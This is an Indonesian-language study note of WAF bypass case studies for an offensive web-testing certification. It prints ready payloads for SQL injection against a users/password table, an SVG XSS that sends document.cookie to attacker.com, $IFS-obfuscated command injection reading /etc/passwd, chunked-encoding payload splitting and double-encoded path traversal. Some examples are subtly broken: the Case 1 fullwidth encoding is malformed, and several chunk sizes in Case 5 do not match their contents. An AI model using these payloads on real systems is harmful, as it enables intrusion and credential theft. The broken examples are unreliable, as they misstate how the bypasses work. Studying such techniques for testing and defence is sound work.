2026-02-06

Status:

Tags: [[eWPTX]] [[Bypassing Filters & Evasion]]
###### Prasyarat: [[WAF Bypass Payloads & Techniques]]
# Studi Kasus Bypass Filter

## Kasus 1: Bypass SQLi Cloudflare via normalisasi Unicode

**Konteks**: Cloudflare WAF memblok payload UNION SELECT standar.

**Teknik**: pakai karakter fullwidth Unicode. Regex Cloudflare tidak match varian fullwidth, tapi backend MySQL menormalisasinya.

```
# Blocked
id=1' UNION SELECT 1,2,3--

# Bypass using fullwidth
id=1'%EF%BC%BUNION%EF%BC%BSELECT%EF%BC%B1,2,3--
```

**Pelajaran**: regex WAF bekerja pada raw bytes; backend bisa melakukan normalisasi Unicode sebelum eksekusi query.

---

## Kasus 2: Bypass SQLi ModSecurity CRS via komentar bersarang

**Konteks**: ModSecurity dengan OWASP Core Rule Set (CRS) v3.x, paranoia level 1.

**Teknik**: komentar version-conditional MySQL untuk bypass deteksi keyword.

```sql
# Blocked by CRS
' UNION SELECT password FROM users--

# Bypass: version comments
' /*!50000UNION*/ /*!50000SELECT*/ password /*!50000FROM*/ users--
```

**Kenapa bisa**: rule CRS mencari pola `UNION\s+SELECT`. Version comment memecah urutan whitespace yang diharapkan. MySQL memperlakukan `/*!50000...*/` sebagai kode yang dieksekusi pada versi >= 5.0.

**Pelajaran**: pahami pola regex yang dipakai rule, lalu rusak urutan token yang diharapkan.

---

## Kasus 3: Bypass XSS AWS WAF via SVG

**Konteks**: managed rule XSS AWS WAF memblok tag `<script>`.

**Teknik**: pakai elemen SVG yang tidak tercakup oleh default managed rule.

```html
# Blocked
<script>alert(document.cookie)</script>

# Bypass
<svg/onload=fetch('https://attacker.com/?c='+document.cookie)>
```

**Pelajaran**: ruleset managed sering fokus ke vektor umum. Elemen HTML alternatif + event handler bisa jadi jalur bypass.

---

## Kasus 4: Bypass command injection Imperva via $IFS

**Konteks**: Imperva WAF memblok perintah yang mengandung spasi.

**Teknik**: ganti spasi dengan `$IFS` (bash Internal Field Separator).

```bash
# Blocked
; cat /etc/passwd

# Bypass
;cat$IFS/etc/passwd

# Further obfuscation
;c\at$IFS/e?c/p*ss*d
```

**Pelajaran**: bash fleksibel dengan quoting/expansion. Glob pattern dan variable expansion memberi banyak cara menyusun perintah tanpa memicu filter keyword.

---

## Kasus 5: Bypass SQLi Akamai via chunked Transfer-Encoding

**Konteks**: Akamai WAF menginspeksi request body sebagai satu buffer.

**Teknik**: gunakan chunked Transfer-Encoding untuk memecah payload.

```http
POST /search HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

3
q=1
4
' UN
5
ION S
6
ELECT
9
 passwo
6
rd FRO
7
M users
1
-
2
-
0
```

**Kenapa bisa**: WAF menginspeksi tiap chunk, tapi tidak selalu reassemble body penuh sebelum pattern matching.

**Pelajaran**: fitur level protokol (chunked encoding, stream HTTP/2) bisa memecah payload di bawah ambang reassembly WAF.

---

## Kasus 6: Path traversal dengan double encoding

**Konteks**: aplikasi memakai WAF yang URL-decode sekali sebelum mengecek `../`.

**Teknik**: double-encode karakter traversal.

```
# Blocked (WAF decodes %2e%2e%2f to ../)
GET /files?path=%2e%2e%2fetc/passwd

# Bypass (WAF decodes once to %2e%2e%2f, doesn't see ../)
GET /files?path=%252e%252e%252fetc/passwd
```

**Di aplikasi**: terjadi decode kedua, sehingga kembali menjadi `../etc/passwd`.

**Pelajaran**: hitung berapa kali decode terjadi antara WAF dan aplikasi. Tiap proxy/layer perantara bisa menambah satu langkah decode.

---

## Ringkasan poin penting

1. **Kenali target**: arsitektur tiap WAF bisa sangat berbeda
2. **Pahami rantai decode**: petakan semua transformasi dari client sampai backend
3. **Rusak pola, bukan makna**: ganggu regex WAF tanpa mengubah arti payload di backend
4. **Layer teknik**: gabungkan encoding + case + comment jika perlu
5. **Uji bertahap**: mulai dari yang sederhana, tambah kompleksitas seperlunya
6. **Dokumentasikan**: catat yang berhasil—setelah diketahui, bypass yang sama jarang bertahan lama
